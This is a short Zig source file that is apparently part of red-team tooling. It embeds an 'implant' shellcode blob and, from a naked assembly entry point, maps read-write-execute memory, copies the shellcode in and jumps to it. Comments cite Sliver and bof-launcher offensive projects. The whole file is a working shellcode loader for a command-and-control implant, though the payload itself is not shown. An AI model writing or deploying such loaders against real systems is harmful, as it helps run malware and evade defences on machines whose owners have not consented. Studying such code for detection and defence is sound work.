const builtin = @import("builtin");
const std = @import("std");
const main = @import("main");
const bof_launcher = @import("bof_launcher_api");

const exe_raw = @embedFile("implant_shellcode_embed");

pub export fn _start() linksection(".startup") callconv(.naked) noreturn {
    asm volatile (switch (builtin.cpu.arch) {
            .x86_64 =>
            \\ xorl %%ebp, %%ebp
            \\ andq $-16, %%rsp
            \\ callq %[entrypoint:P]
            ,
            else => @compileError("Unsupported arch"),
        }
        :
        : [entrypoint] "X" (&entry),
    );
}

fn entry() noreturn {

    // RW
    // mprotect
    // RX
    // https://github.com/sliverarmory/malasada/blob/main/testdata/runner/runner.c
    // https://github.com/The-Z-Labs/bof-launcher/blob/main/bof-launcher/src/bof_launcher.zig#L2566

    const img = std.posix.mmap(
        null,
        exe_raw.len,
        std.posix.PROT.READ | std.posix.PROT.EXEC | std.posix.PROT.WRITE,
        .{ .TYPE = .PRIVATE, .ANONYMOUS = true },
        -1,
        0,
    ) catch unreachable;
    @memcpy(img, exe_raw);

    @as(*const fn () callconv(.c) void, @ptrCast(img))();

    unreachable;
}
